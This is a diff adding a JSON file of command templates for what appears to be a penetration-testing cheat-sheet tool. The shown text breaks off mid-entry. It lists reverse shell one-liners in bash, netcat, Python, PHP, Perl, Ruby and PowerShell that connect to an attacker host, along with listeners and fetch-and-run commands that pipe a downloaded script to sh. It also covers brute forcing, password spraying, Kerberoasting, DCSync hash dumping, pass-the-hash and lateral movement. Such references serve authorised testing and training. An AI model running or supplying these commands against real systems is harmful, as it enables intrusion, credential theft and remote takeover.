@@ -1,0 +1,1996 @@
+[
+  {
+    "id": "bash-i",
+    "group": "Reverse Shells",
+    "category": "Unix",
+    "name": "Bash -i (/dev/tcp)",
+    "type": "bash",
+    "encoding": "raw",
+    "template": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
+    "notes": "Classic bash TCP reverse shell. Needs bash with /dev/tcp (not dash/sh)."
+  },
+  {
+    "id": "bash-c",
+    "group": "Reverse Shells",
+    "category": "Unix",
+    "name": "Bash -c wrapper",
+    "type": "bash",
+    "encoding": "raw",
+    "template": "bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'",
+    "notes": "Forces bash when the injection point runs /bin/sh."
+  },
+  {
+    "id": "bash-url",
+    "group": "Reverse Shells",
+    "category": "Web-encoded",
+    "name": "Bash -i (URL-encoded)",
+    "type": "bash",
+    "encoding": "url",
+    "template": "bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'",
+    "notes": "Percent-encoded for a URL/POST parameter."
+  },
+  {
+    "id": "nc-mkfifo",
+    "group": "Reverse Shells",
+    "category": "Unix",
+    "name": "nc mkfifo (no -e)",
+    "type": "nc",
+    "encoding": "raw",
+    "template": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | {SHELL} -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f",
+    "notes": "For netcat builds without -e."
+  },
+  {
+    "id": "nc-e",
+    "group": "Reverse Shells",
+    "category": "Unix",
+    "name": "nc -e",
+    "type": "nc",
+    "encoding": "raw",
+    "template": "nc {LHOST} {LPORT} -e {SHELL}",
+    "notes": "Only if the target nc supports -e."
+  },
+  {
+    "id": "ncat-ssl",
+    "group": "Reverse Shells",
+    "category": "Unix",
+    "name": "ncat --ssl",
+    "type": "ncat",
+    "encoding": "raw",
+    "template": "ncat --ssl {LHOST} {LPORT} -e {SHELL}",
+    "notes": "Encrypted. Listener: ncat --ssl -lvnp {LPORT}."
+  },
+  {
+    "id": "python3-pty",
+    "group": "Reverse Shells",
+    "category": "Unix",
+    "name": "python3 pty",
+    "type": "python",
+    "encoding": "raw",
+    "template": "python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"{SHELL}\")'",
+    "notes": "Spawns a pty directly. Swap python3 for python on old hosts."
+  },
+  {
+    "id": "php",
+    "group": "Reverse Shells",
+    "category": "Unix",
+    "name": "PHP fsockopen",
+    "type": "php",
+    "encoding": "raw",
+    "template": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"{SHELL} -i <&3 >&3 2>&3\");'",
+    "notes": "Assumes fd 3. If exec is disabled try system/passthru."
+  },
+  {
+    "id": "perl",
+    "group": "Reverse Shells",
+    "category": "Unix",
+    "name": "Perl socket",
+    "type": "perl",
+    "encoding": "raw",
+    "template": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{SHELL} -i\");};'",
+    "notes": "Portable; on most Linux + appliances."
+  },
+  {
+    "id": "ruby",
+    "group": "Reverse Shells",
+    "category": "Unix",
+    "name": "Ruby socket",
+    "type": "ruby",
+    "encoding": "raw",
+    "template": "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"{SHELL} -i <&%d >&%d 2>&%d\",f,f,f)'",
+    "notes": "Where Ruby is installed (Rails boxes)."
+  },
+  {
+    "id": "socat",
+    "group": "Reverse Shells",
+    "category": "Unix",
+    "name": "socat (full pty)",
+    "type": "socat",
+    "encoding": "raw",
+    "template": "socat TCP:{LHOST}:{LPORT} EXEC:'{SHELL}',pty,stderr,setsid,sigint,sane",
+    "notes": "Fully interactive. Listener: socat file:`tty`,raw,echo=0 TCP-L:{LPORT}."
+  },
+  {
+    "id": "awk",
+    "group": "Reverse Shells",
+    "category": "Unix",
+    "name": "awk /inet/tcp",
+    "type": "awk",
+    "encoding": "raw",
+    "template": "awk 'BEGIN {s = \"/inet/tcp/0/{LHOST}/{LPORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
+    "notes": "Needs gawk (|& coprocess). mawk/nawk won't work."
+  },
+  {
+    "id": "golang",
+    "group": "Reverse Shells",
+    "category": "Unix",
+    "name": "Go (run from source)",
+    "type": "golang",
+    "encoding": "raw",
+    "template": "echo 'package main;import(\"net\";\"os/exec\");func main(){c,_:=net.Dial(\"tcp\",\"{LHOST}:{LPORT}\");cmd:=exec.Command(\"{SHELL}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go",
+    "notes": "Needs Go on target. Cross-compile a static binary for deployment."
+  },
+  {
+    "id": "powershell-b64",
+    "group": "Reverse Shells",
+    "category": "Windows",
+    "name": "PowerShell (base64 -EncodedCommand)",
+    "type": "powershell",
+    "encoding": "base64",
+    "template": "$client = New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+    "notes": "UTF-16LE base64. Run: powershell -e <output>"
+  },
+  {
+    "id": "powershell-oneliner",
+    "group": "Reverse Shells",
+    "category": "Windows",
+    "name": "PowerShell (raw one-liner)",
+    "type": "powershell",
+    "encoding": "raw",
+    "template": "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}\"",
+    "notes": "Unencoded; may trip AMSI/Defender."
+  },
+  {
+    "id": "lst-nc",
+    "group": "Listeners & Upgrade",
+    "category": "Listeners",
+    "name": "nc listener",
+    "type": "nc",
+    "encoding": "raw",
+    "template": "nc -lvnp {LPORT}",
+    "notes": "Start before firing any reverse shell."
+  },
+  {
+    "id": "lst-ncat-ssl",
+    "group": "Listeners & Upgrade",
+    "category": "Listeners",
+    "name": "ncat --ssl listener",
+    "type": "ncat",
+    "encoding": "raw",
+    "template": "ncat --ssl -lvnp {LPORT}",
+    "notes": "Matches the ncat --ssl reverse shell."
+  },
+  {
+    "id": "lst-socat",
+    "group": "Listeners & Upgrade",
+    "category": "Listeners",
+    "name": "socat listener (pty)",
+    "type": "socat",
+    "encoding": "raw",
+    "template": "socat -d -d file:`tty`,raw,echo=0 TCP-L:{LPORT}",
+    "notes": "Fully interactive listener for the socat reverse shell."
+  },
+  {
+    "id": "up-pty",
+    "group": "Listeners & Upgrade",
+    "category": "TTY upgrade",
+    "name": "TTY upgrade (python pty)",
+    "type": "shell",
+    "encoding": "raw",
+    "template": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+    "notes": "Step 1. Then Ctrl-Z."
+  },
+  {
+    "id": "up-stty",
+    "group": "Listeners & Upgrade",
+    "category": "TTY upgrade",
+    "name": "TTY upgrade (stty raw)",
+    "type": "shell",
+    "encoding": "raw",
+    "template": "stty raw -echo; fg",
+    "notes": "Step 2 (after Ctrl-Z). Then: export TERM=xterm; stty rows 38 columns 116."
+  },
+  {
+    "id": "enum-nmap-full",
+    "group": "Enumeration",
+    "category": "Nmap",
+    "name": "nmap full TCP",
+    "type": "nmap",
+    "encoding": "raw",
+    "template": "nmap -p- --min-rate 5000 -sV -sC {TARGET} -oN nmap_full.txt",
+    "options": [
+      "-Pn",
+      "-A",
+      "-O",
+      "-v",
+      "--open",
+      "-T4",
+      "--script vuln"
+    ],
+    "notes": "All TCP ports, versions + default scripts."
+  },
+  {
+    "id": "enum-nmap-udp",
+    "group": "Enumeration",
+    "category": "Nmap",
+    "name": "nmap top UDP",
+    "type": "nmap",
+    "encoding": "raw",
+    "template": "nmap -sU --top-ports 100 {TARGET} -oN nmap_udp.txt",
+    "options": [
+      "-Pn",
+      "-sV",
+      "-sC",
+      "-A",
+      "-O",
+      "-v",
+      "--open",
+      "-T4",
+      "--min-rate 5000",
+      "--script vuln"
+    ],
+    "notes": "UDP is slow; top 100 is usually enough."
+  },
+  {
+    "id": "enum-nmap-port",
+    "group": "Enumeration",
+    "category": "Nmap",
+    "name": "nmap targeted port",
+    "type": "nmap",
+    "encoding": "raw",
+    "template": "nmap -sV -sC -p {RPORT} {TARGET} -oN nmap_{RPORT}.txt",
+    "options": [
+      "-Pn",
+      "-A",
+      "-O",
+      "-v",
+      "--open",
+      "-T4",
+      "--min-rate 5000",
+      "--script vuln"
+    ],
+    "notes": "Deep scan of one discovered port."
+  },
+  {
+    "id": "enum-smbmap",
+    "group": "Enumeration",
+    "category": "SMB",
+    "name": "smbmap (null)",
+    "type": "smbmap",
+    "encoding": "raw",
+    "template": "smbmap -H {TARGET} -u null",
+    "options": [
+      "-r",
+      "-R",
+      "--depth 5"
+    ],
+    "notes": "Anonymous share + permission listing."
+  },
+  {
+    "id": "enum-smbclient",
+    "group": "Enumeration",
+    "category": "SMB",
+    "name": "smbclient list (null)",
+    "type": "smbclient",
+    "encoding": "raw",
+    "template": "smbclient -L //{TARGET}/ -N",
+    "options": [],
+    "notes": "Anonymous share listing."
+  },
+  {
+    "id": "enum-snmpwalk",
+    "group": "Enumeration",
+    "category": "SNMP",
+    "name": "snmpwalk (public)",
+    "type": "snmp",
+    "encoding": "raw",
+    "template": "snmpwalk -v2c -c public {TARGET}",
+    "options": [
+      "-Oa"
+    ],
+    "notes": "Try communities: public, private, community."
+  },
+  {
+    "id": "enum-dns-axfr",
+    "group": "Enumeration",
+    "category": "DNS",
+    "name": "DNS zone transfer",
+    "type": "dns",
+    "encoding": "raw",
+    "template": "dig axfr {DOMAIN} @{TARGET}",
+    "notes": "Full zone dump if the DNS server allows AXFR."
+  },
+  {
+    "id": "web-gobuster",
+    "group": "Web Attacks",
+    "category": "Content Discovery",
+    "name": "gobuster dir",
+    "type": "gobuster",
+    "encoding": "raw",
+    "template": "gobuster dir -u {URL} -w {WORDLIST} -b 404 -k -t 50",
+    "options": [
+      "-x php,txt,html",
+      "-e",
+      "-r",
+      "-q",
+      "--no-error"
+    ],
+    "notes": "-k skip TLS verify. Add -x php,txt,html for extensions."
+  },
+  {
+    "id": "web-gobuster-ext",
+    "group": "Web Attacks",
+    "category": "Content Discovery",
+    "name": "gobuster dir + extensions",
+    "type": "gobuster",
+    "encoding": "raw",
+    "template": "gobuster dir -u {URL} -w {WORDLIST} -x php,txt,html,aspx -b 404 -k -t 50",
+    "options": [
+      "-e",
+      "-r",
+      "-q",
+      "--no-error"
+    ],
+    "notes": "Directory + file discovery."
+  },
+  {
+    "id": "web-feroxbuster",
+    "group": "Web Attacks",
+    "category": "Content Discovery",
+    "name": "feroxbuster",
+    "type": "feroxbuster",
+    "encoding": "raw",
+    "template": "feroxbuster -u {URL} -w {WORDLIST} -x php,html,txt",
+    "options": [
+      "-k",
+      "-e",
+      "-r",
+      "--thorough",
+      "-d 2"
+    ],
+    "notes": "Recursive by default."
+  },
+  {
+    "id": "web-ffuf-dir",
+    "group": "Web Attacks",
+    "category": "Content Discovery",
+    "name": "ffuf dir",
+    "type": "ffuf",
+    "encoding": "raw",
+    "template": "ffuf -c -w {WORDLIST} -u {URL}/FUZZ -fw 2",
+    "options": [
+      "-mc all",
+      "-fc 404",
+      "-fs 0",
+      "-e .php,.txt,.html",
+      "-recursion",
+      "-t 40"
+    ],
+    "notes": "-fw filters by word count; tune to the 404 body."
+  },
+  {
+    "id": "web-ffuf-vhost",
+    "group": "Web Attacks",
+    "category": "Content Discovery",
+    "name": "ffuf vhost",
+    "type": "ffuf",
+    "encoding": "raw",
+    "template": "ffuf -c -w {WORDLIST} -H \"Host: FUZZ.{DOMAIN}\" -u {URL}",
+    "options": [
+      "-mc all",
+      "-fc 404",
+      "-fs 0",
+      "-e .php,.txt,.html",
+      "-recursion",
+      "-t 40"
+    ],
+    "notes": "Virtual-host discovery; filter with -fs/-fw."
+  },
+  {
+    "id": "web-sqlmap",
+    "group": "Web Attacks",
+    "category": "SQLi",
+    "name": "sqlmap (URL)",
+    "type": "sqlmap",
+    "encoding": "raw",
+    "template": "sqlmap -u \"{URL}\" --batch --dbs",
+    "options": [
+      "--tables",
+      "--dump",
+      "--level 5",
+      "--risk 3",
+      "--threads 5",
+      "--random-agent",
+      "--forms",
+      "--crawl 2"
+    ],
+    "notes": "Add -p param, --cookie, or --data for POST."
+  },
+  {
+    "id": "web-sqlmap-forms",
+    "group": "Web Attacks",
+    "category": "SQLi",
+    "name": "sqlmap (forms)",
+    "type": "sqlmap",
+    "encoding": "raw",
+    "template": "sqlmap -u \"{URL}\" --forms --batch --dbs",
+    "options": [
+      "--tables",
+      "--dump",
+      "--level 5",
+      "--risk 3",
+      "--threads 5",
+      "--random-agent",
+      "--crawl 2"
+    ],
+    "notes": "Auto-detects and tests page forms."
+  },
+  {
+    "id": "web-wpscan",
+    "group": "Web Attacks",
+    "category": "CMS",
+    "name": "wpscan (enum users+plugins)",
+    "type": "wpscan",
+    "encoding": "raw",
+    "template": "wpscan --url {URL} --enumerate u,vp --disable-tls-checks",
+    "options": [
+      "--plugins-detection aggressive",
+      "--random-user-agent"
+    ],
+    "notes": "Add --api-token for vuln data."
+  },
+  {
+    "id": "web-nikto",
+    "group": "Web Attacks",
+    "category": "Scanning",
+    "name": "nikto",
+    "type": "nikto",
+    "encoding": "raw",
+    "template": "nikto -h {URL}",
+    "options": [
+      "-ssl",
+      "-C all",
+      "-Tuning 1234567890abc"
+    ],
+    "notes": "Quick misconfig/known-file scan."
+  },
+  {
+    "id": "bf-hydra-ssh",
+    "group": "Brute Force",
+    "category": "Hydra",
+    "name": "hydra SSH",
+    "type": "hydra",
+    "encoding": "raw",
+    "template": "hydra -l {USER} -P {WORDLIST} ssh://{TARGET} -I",
+    "options": [
+      "-V",
+      "-f",
+      "-t 4",
+      "-u"
+    ],
+    "notes": "-L users_file for multiple users."
+  },
+  {
+    "id": "bf-hydra-ftp",
+    "group": "Brute Force",
+    "category": "Hydra",
+    "name": "hydra FTP",
+    "type": "hydra",
+    "encoding": "raw",
+    "template": "hydra -l {USER} -P {WORDLIST} ftp://{TARGET} -I",
+    "options": [
+      "-V",
+      "-f",
+      "-t 4",
+      "-u"
+    ],
+    "notes": ""
+  },
+  {
+    "id": "bf-hydra-smb",
+    "group": "Brute Force",
+    "category": "Hydra",
+    "name": "hydra SMB",
+    "type": "hydra",
+    "encoding": "raw",
+    "template": "hydra -l {USER} -P {WORDLIST} smb://{TARGET}",
+    "options": [
+      "-V",
+      "-f",
+      "-I",
+      "-t 4",
+      "-u"
+    ],
+    "notes": "Mind account lockout."
+  },
+  {
+    "id": "bf-hydra-rdp",
+    "group": "Brute Force",
+    "category": "Hydra",
+    "name": "hydra RDP",
+    "type": "hydra",
+    "encoding": "raw",
+    "template": "hydra -l {USER} -P {WORDLIST} rdp://{TARGET}",
+    "options": [
+      "-V",
+      "-f",
+      "-I",
+      "-t 4",
+      "-u"
+    ],
+    "notes": "Lockout risk is high on RDP."
+  },
+  {
+    "id": "bf-hydra-httppost",
+    "group": "Brute Force",
+    "category": "Hydra",
+    "name": "hydra HTTP POST form",
+    "type": "hydra",
+    "encoding": "raw",
+    "template": "hydra -l {USER} -P {WORDLIST} {TARGET} http-post-form \"/login.php:username=^USER^&password=^PASS^:invalid\" -vV -f",
+    "options": [
+      "-V",
+      "-I",
+      "-t 4",
+      "-u"
+    ],
+    "notes": "Change path, fields, and the failure string (:invalid)."
+  },
+  {
+    "id": "ad-rpcclient-null",
+    "group": "Active Directory",
+    "category": "Enumeration",
+    "name": "rpcclient NULL session",
+    "type": "rpcclient",
+    "encoding": "raw",
+    "template": "rpcclient -U '' -N {DC_IP}",
+    "options": [],
+    "notes": "Then enumdomusers, querydominfo, enumdomgroups."
+  },
+  {
+    "id": "ad-enum4linux-ng",
+    "group": "Active Directory",
+    "category": "Enumeration",
+    "name": "enum4linux-ng (full)",
+    "type": "enum4linux",
+    "encoding": "raw",
+    "template": "enum4linux-ng -A {DC_IP}",
+    "options": [
+      "-U",
+      "-S",
+      "-P",
+      "-G",
+      "-o"
+    ],
+    "notes": "-P for password policy only."
+  },
+  {
+    "id": "ad-cme-null-shares",
+    "group": "Active Directory",
+    "category": "Enumeration",
+    "name": "nxc SMB null shares",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET} -u '' -p '' --shares",
+    "notes": "Swap nxc for nxc (netexec) on newer setups."
+  },
+  {
+    "id": "ad-kerbrute-userenum",
+    "group": "Active Directory",
+    "category": "Enumeration",
+    "name": "kerbrute user enumeration",
+    "type": "kerbrute",
+    "encoding": "raw",
+    "template": "kerbrute userenum -d {DOMAIN} --dc {DC_IP} {WORDLIST}",
+    "options": [
+      "-v",
+      "-t 10"
+    ],
+    "notes": "Valid usernames via Kerberos pre-auth, no lockout."
+  },
+  {
+    "id": "ad-ldapsearch-nc",
+    "group": "Active Directory",
+    "category": "Enumeration",
+    "name": "ldapsearch naming contexts",
+    "type": "ldapsearch",
+    "encoding": "raw",
+    "template": "ldapsearch -x -H ldap://{DC_IP} -s base namingcontexts",
+    "options": [
+      "-LLL",
+      "-E pr=1000/noprompt"
+    ],
+    "notes": "Read base DN, then -b 'DC=...,DC=...' for full queries."
+  },
+  {
+    "id": "ad-dns-srv",
+    "group": "Active Directory",
+    "category": "Enumeration",
+    "name": "DNS SRV: find DCs",
+    "type": "dns",
+    "encoding": "raw",
+    "template": "nslookup -type=SRV _ldap._tcp.dc._msdcs.{DOMAIN} {DC_IP}",
+    "notes": "Locate domain controllers via DNS."
+  },
+  {
+    "id": "ad-responder",
+    "group": "Active Directory",
+    "category": "Enumeration",
+    "name": "Responder (poison)",
+    "type": "responder",
+    "encoding": "raw",
+    "template": "responder -I {IFACE} -wv",
+    "options": [
+      "-A",
+      "-w",
+      "-F",
+      "-P",
+      "-v"
+    ],
+    "notes": "Capture NetNTLMv2 from LLMNR/NBT-NS/mDNS. Crack with hashcat -m 5600."
+  },
+  {
+    "id": "ad-cme-passpol",
+    "group": "Active Directory",
+    "category": "Password Attacks",
+    "name": "nxc password policy",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {DC_IP} -u {USER} -p {PASS} --pass-pol",
+    "notes": "Read lockout threshold BEFORE spraying."
+  },
+  {
+    "id": "ad-cme-spray",
+    "group": "Active Directory",
+    "category": "Password Attacks",
+    "name": "nxc password spray",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {DC_IP} -u {WORDLIST} -p {PASS} --continue-on-success | grep +",
+    "notes": "USER field = a users file. One password, many users."
+  },
+  {
+    "id": "ad-kerbrute-spray",
+    "group": "Active Directory",
+    "category": "Password Attacks",
+    "name": "kerbrute password spray",
+    "type": "kerbrute",
+    "encoding": "raw",
+    "template": "kerbrute passwordspray -d {DOMAIN} --dc {DC_IP} {WORDLIST} {PASS}",
+    "options": [
+      "-v",
+      "-t 10"
+    ],
+    "notes": "WORDLIST = valid users file."
+  },
+  {
+    "id": "ad-cme-validate",
+    "group": "Active Directory",
+    "category": "Password Attacks",
+    "name": "nxc validate creds",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET} -u {USER} -p {PASS}",
+    "notes": "'Pwn3d!' = local admin on that host."
+  },
+  {
+    "id": "ad-cme-pth",
+    "group": "Active Directory",
+    "category": "Password Attacks",
+    "name": "nxc pass-the-hash",
+    "type": "nxc",
+    "encoding": "raw",
+    "template": "nxc smb {TARGET} -u {USER} -H {HASH} --local-auth",
+    "notes": "Drop --local-auth for a domain account."
+  },
+  {
+    "id": "ad-asrep-roast",
+    "group": "Active Directory",
+    "category": "Kerberos",
+    "name": "AS-REP roast (userlist)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "GetNPUsers.py {DOMAIN}/ -dc-ip {DC_IP} -usersfile {WORDLIST} -format hashcat -no-pass",
+    "options": [
+      "-k",
+      "-debug"
+    ],
+    "notes": "No-preauth accounts. Crack: hashcat -m 18200."
+  },
+  {
+    "id": "ad-asrep-roast-creds",
+    "group": "Active Directory",
+    "category": "Kerberos",
+    "name": "AS-REP roast (authenticated)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "GetNPUsers.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC_IP} -request -format hashcat",
+    "options": [
+      "-k",
+      "-no-pass",
+      "-debug"
+    ],
+    "notes": "Request all AS-REP-roastable hashes with creds."
+  },
+  {
+    "id": "ad-kerberoast",
+    "group": "Active Directory",
+    "category": "Kerberos",
+    "name": "Kerberoast (GetUserSPNs)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "GetUserSPNs.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC_IP} -request -outputfile spns.txt",
+    "options": [
+      "-k",
+      "-no-pass",
+      "-debug"
+    ],
+    "notes": "TGS for SPN accounts. Crack: hashcat -m 13100."
+  },
+  {
+    "id": "ad-smbmap",
+    "group": "Active Directory",
+    "category": "Credentialed",
+    "name": "smbmap share permissions",
+    "type": "smbmap",
+    "encoding": "raw",
+    "template": "smbmap -u {USER} -p {PASS} -d {DOMAIN} -H {TARGET}",
+    "options": [
+      "-r",
+      "-R",
+      "--depth 5"
+    ],
+    "notes": "-R to recurse a share."
+  },
+  {
+    "id": "ad-bloodhound-py",
+    "group": "Active Directory",
+    "category": "Credentialed",
+    "name": "bloodhound-python (collect all)",
+    "type": "bloodhound",
+    "encoding": "raw",
+    "template": "bloodhound-python -u {USER} -p {PASS} -ns {DC_IP} -d {DOMAIN} -c all",
+    "options": [
+      "--zip",
+      "--dns-tcp"
+    ],
+    "notes": "Import the zip into the BloodHound GUI."
+  },
+  {
+    "id": "ad-secretsdump",
+    "group": "Active Directory",
+    "category": "Credentialed",
+    "name": "secretsdump (creds)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "secretsdump.py {DOMAIN}/{USER}:{PASS}@{TARGET}",
+    "options": [
+      "-k",
+      "-no-pass",
+      "-debug"
+    ],
+    "notes": "SAM/LSA/cached creds where you have admin."
+  },
+  {
+    "id": "ad-dcsync",
+    "group": "Active Directory",
+    "category": "Credentialed",
+    "name": "DCSync (secretsdump -just-dc)",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "secretsdump.py -just-dc {DOMAIN}/{USER}:{PASS}@{DC_IP}",
+    "options": [
+      "-k",
+      "-no-pass",
+      "-debug"
+    ],
+    "notes": "Needs replication rights. Dumps all domain hashes."
+  },
+  {
+    "id": "ad-psexec",
+    "group": "Active Directory",
+    "category": "Lateral Movement",
+    "name": "impacket psexec",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "psexec.py {DOMAIN}/{USER}:{PASS}@{TARGET}",
+    "options": [
+      "-k",
+      "-no-pass",
+      "-debug"
+    ],
+    "notes": "SYSTEM shell via ADMIN$. Noisy."
+  },
+  {
+    "id": "ad-wmiexec",
+    "group": "Active Directory",
+    "category": "Lateral Movement",
+    "name": "impacket wmiexec",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "wmiexec.py {DOMAIN}/{USER}:{PASS}@{TARGET}",
+    "options": [
+      "-k",
+      "-no-pass",
+      "-debug"
+    ],
+    "notes": "Quieter; no service dropped."
+  },
+  {
+    "id": "ad-psexec-pth",
+    "group": "Active Directory",
+    "category": "Lateral Movement",
+    "name": "psexec pass-the-hash",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "psexec.py -hashes :{HASH} {DOMAIN}/{USER}@{TARGET}",
+    "options": [
+      "-k",
+      "-no-pass",
+      "-debug"
+    ],
+    "notes": "LM half can be empty (leading colon)."
+  },
+  {
+    "id": "ad-evil-winrm",
+    "group": "Active Directory",
+    "category": "Lateral Movement",
+    "name": "evil-winrm (password)",
+    "type": "evil-winrm",
+    "encoding": "raw",
+    "template": "evil-winrm -i {TARGET} -u {USER} -p {PASS}",
+    "options": [
+      "-S"
+    ],
+    "notes": "WinRM 5985/5986. Needs Remote Management Users."
+  },
+  {
+    "id": "ad-evil-winrm-pth",
+    "group": "Active Directory",
+    "category": "Lateral Movement",
+    "name": "evil-winrm pass-the-hash",
+    "type": "evil-winrm",
+    "encoding": "raw",
+    "template": "evil-winrm -i {TARGET} -u {USER} -H {HASH}",
+    "options": [
+      "-S"
+    ],
+    "notes": "WinRM with NTLM hash."
+  },
+  {
+    "id": "ad-xfreerdp",
+    "group": "Active Directory",
+    "category": "Lateral Movement",
+    "name": "xfreerdp login",
+    "type": "rdp",
+    "encoding": "raw",
+    "template": "xfreerdp /u:{USER} /p:{PASS} /d:{DOMAIN} /v:{TARGET} +clipboard /dynamic-resolution",
+    "notes": "Use /pth:{HASH} for RDP pass-the-hash."
+  },
+  {
+    "id": "db-mysql",
+    "group": "Databases",
+    "category": "MySQL",
+    "name": "mysql client",
+    "type": "mysql",
+    "encoding": "raw",
+    "template": "mysql -h {TARGET} -u {USER} -p{PASS}",
+    "notes": "No space after -p. Then: show databases;"
+  },
+  {
+    "id": "db-mssql",
+    "group": "Databases",
+    "category": "MSSQL",
+    "name": "impacket mssqlclient",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "mssqlclient.py {DOMAIN}/{USER}:{PASS}@{TARGET} -windows-auth",
+    "options": [
+      "-k",
+      "-no-pass",
+      "-debug"
+    ],
+    "notes": "Then enable_xp_cmdshell for RCE. Drop -windows-auth for SQL auth."
+  },
+  {
+    "id": "db-psql",
+    "group": "Databases",
+    "category": "Postgres",
+    "name": "psql client",
+    "type": "postgres",
+    "encoding": "raw",
+    "template": "psql -h {TARGET} -U {USER}",
+    "notes": "Then \\l to list databases."
+  },
+  {
+    "id": "pe-linpeas",
+    "group": "Privilege Escalation",
+    "category": "Linux",
+    "name": "linpeas (fetch + run)",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "curl http://{LHOST}:{LPORT}/linpeas.sh | sh",
+    "notes": "Serve it: python3 -m http.server {LPORT} from the linpeas dir."
+  },
+  {
+    "id": "pe-sudo",
+    "group": "Privilege Escalation",
+    "category": "Linux",
+    "name": "sudo -l",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "sudo -l",
+    "notes": "Check GTFOBins for any allowed binary."
+  },
+  {
+    "id": "pe-suid",
+    "group": "Privilege Escalation",
+    "category": "Linux",
+    "name": "find SUID binaries",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "find / -perm -4000 -type f 2>/dev/null",
+    "notes": "Cross-check hits against GTFOBins."
+  },
+  {
+    "id": "pe-caps",
+    "group": "Privilege Escalation",
+    "category": "Linux",
+    "name": "find capabilities",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "getcap -r / 2>/dev/null",
+    "notes": "cap_setuid=ep on python/perl = instant root."
+  },
+  {
+    "id": "pe-winpeas",
+    "group": "Privilege Escalation",
+    "category": "Windows",
+    "name": "winPEAS (fetch + run)",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "certutil -urlcache -f http://{LHOST}/winPEAS.exe winPEAS.exe && winPEAS.exe",
+    "notes": "Serve winPEAS.exe over HTTP from your attack host."
+  },
+  {
+    "id": "pe-whoami-priv",
+    "group": "Privilege Escalation",
+    "category": "Windows",
+    "name": "whoami /priv",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "whoami /priv",
+    "notes": "SeImpersonate/SeAssign = Potato attacks. SeBackup/SeRestore = shadow copy."
+  },
+  {
+    "id": "pe-systeminfo",
+    "group": "Privilege Escalation",
+    "category": "Windows",
+    "name": "systeminfo",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "systeminfo",
+    "notes": "Feed into Watson/wesng for missing-patch privesc."
+  },
+  {
+    "id": "ft-httpserver",
+    "group": "File Transfer",
+    "category": "Serve (attacker)",
+    "name": "python http.server",
+    "type": "python",
+    "encoding": "raw",
+    "template": "python3 -m http.server {LPORT}",
+    "notes": "Serve the current dir over HTTP."
+  },
+  {
+    "id": "ft-smbserver",
+    "group": "File Transfer",
+    "category": "Serve (attacker)",
+    "name": "impacket smbserver",
+    "type": "impacket",
+    "encoding": "raw",
+    "template": "impacket-smbserver share $(pwd) -smb2support",
+    "options": [
+      "-k",
+      "-no-pass",
+      "-debug"
+    ],
+    "notes": "Grab from Windows: copy \\\\{LHOST}\\share\\file ."
+  },
+  {
+    "id": "ft-wget",
+    "group": "File Transfer",
+    "category": "Fetch (Linux)",
+    "name": "wget",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "wget http://{LHOST}:{LPORT}/{FILE} -O /tmp/{FILE}",
+    "notes": ""
+  },
+  {
+    "id": "ft-curl",
+    "group": "File Transfer",
+    "category": "Fetch (Linux)",
+    "name": "curl",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "curl http://{LHOST}:{LPORT}/{FILE} -o /tmp/{FILE}",
